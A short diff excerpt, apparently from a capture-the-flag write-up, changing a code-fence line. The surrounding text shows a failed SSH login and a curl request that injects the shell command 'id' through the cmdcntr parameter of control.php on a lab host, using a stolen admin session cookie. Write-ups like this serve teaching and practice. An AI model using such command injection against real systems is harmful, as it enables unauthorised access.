@@ -305,7 +305,7 @@ john@192.168.0.83: Permission denied (publickey).
 
 Unfortunetly, it appears that we need a private key to log in. Deciding to revisit, `control.php`, logging in to the site as `admin` using their password, and afterwards try the command injection again with the correct `PHPSESSID`.
 
-```kali@kali ~/Documents/iakeyring/keyring/html
+```
 [ main ✓ ] ❯ curl http://192.168.0.83/control.php?cmdcntr=id -b PHPSESSID=8dcclmcf7jn9bhm78cgmpb1gcc | html2text
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
